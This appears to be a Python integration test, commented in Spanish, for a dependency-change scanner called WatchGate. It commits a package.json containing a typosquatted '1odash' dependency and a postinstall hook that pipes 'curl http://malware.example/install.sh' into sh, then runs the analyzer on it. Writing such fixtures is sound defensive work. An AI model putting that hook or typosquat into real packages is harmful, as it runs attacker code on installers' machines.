#!/usr/bin/env python3
"""Script de prueba de integración End-to-End para la CLI de WatchGate.

Crea un repositorio Git temporal con un cambio sospechoso en dependencias,
ejecuta `watchgate analyze` sobre la CLI real y muestra el reporte renderizado.
"""

from __future__ import annotations

import shutil
import subprocess
import sys
import tempfile
from pathlib import Path

# Asegurar import de watchgate
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from watchgate.cli import main as cli_main


def _run_git(cwd: str, args: list[str]) -> None:
    res = subprocess.run(
        ["git"] + args,
        cwd=cwd,
        capture_output=True,
        text=True,
        check=False,
    )
    if res.returncode != 0:
        raise RuntimeError(f"Error ejecutando git {' '.join(args)}: {res.stderr}")


def main() -> int:
    temp_dir = tempfile.mkdtemp(prefix="watchgate_cli_test_")
    try:
        print("=" * 80)
        print("  WATCHGATE - TEST INTEGRACIÓN CLI (watchgate analyze)")
        print("=" * 80)
        print(f"Directorio Git temporal: {temp_dir}\n")

        # 1. Inicializar repositorio Git de prueba
        _run_git(temp_dir, ["init", "-b", "main"])
        _run_git(temp_dir, ["config", "user.name", "Test Runner"])
        _run_git(temp_dir, ["config", "user.email", "runner@example.com"])

        # 2. Crear commit base
        pkg_json_base = (
            "{\n"
            '  "name": "my-app",\n'
            '  "version": "1.0.0",\n'
            '  "dependencies": {\n'
            '    "express": "^4.18.2"\n'
            "  }\n"
            "}\n"
        )
        (Path(temp_dir) / "package.json").write_text(pkg_json_base, encoding="utf-8")
        _run_git(temp_dir, ["add", "package.json"])
        _run_git(temp_dir, ["commit", "-m", "Initial commit"])

        # 3. Crear commit head con dependencia sospechosa y script malicioso
        pkg_json_head = (
            "{\n"
            '  "name": "my-app",\n'
            '  "version": "1.0.0",\n'
            '  "scripts": {\n'
            '    "postinstall": "curl http://malware.example/install.sh | sh"\n'
            "  },\n"
            '  "dependencies": {\n'
            '    "express": "^4.18.2",\n'
            '    "1odash": "^4.17.21"\n'
            "  }\n"
            "}\n"
        )
        (Path(temp_dir) / "package.json").write_text(pkg_json_head, encoding="utf-8")

        # Crear .watchgate.yml local en el repo de prueba
        watchgate_yml = (
            "weights:\n"
            "  static: 0.0\n"
            "  dependencies: 1.0\n"
            "  reputation: 0.0\n"
            "  semantic: 0.0\n"
            "thresholds:\n"
            "  yellow: 30\n"
            "  red: 70\n"
            "block_on_red: false\n"
        )
        config_path = Path(temp_dir) / ".watchgate.yml"
        config_path.write_text(watchgate_yml, encoding="utf-8")

        _run_git(temp_dir, ["add", "package.json"])
        _run_git(temp_dir, ["commit", "-m", "Add suspicious dependency and postinstall hook"])

        print(">>> Ejecutando `watchgate analyze` en formato Markdown (comment): <<<\n")
        print("-" * 80)

        # 4. Invocación de la CLI
        argv = [
            "analyze",
            "--base",
            "HEAD~1",
            "--head",
            "HEAD",
            "--repo-path",
            temp_dir,
            "--config",
            str(config_path),
            "--pr-id",
            "42",
            "--repo",
            "myorg/my-app",
            "--format",
            "comment",
        ]

        exit_code = cli_main(argv)
        print("-" * 80)
        print(f"\nCódigo de salida de la CLI: {exit_code}")

        print("\n>>> Ejecutando `watchgate analyze` en formato JSON: <<<\n")
        print("-" * 80)
        argv_json = list(argv)
        argv_json[argv_json.index("comment")] = "json"
        cli_main(argv_json)
        print("-" * 80)

        print("\n>>> TEST DE INTEGRACIÓN CLI COMPLETADO CON ÉXITO. <<<")
        return exit_code
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
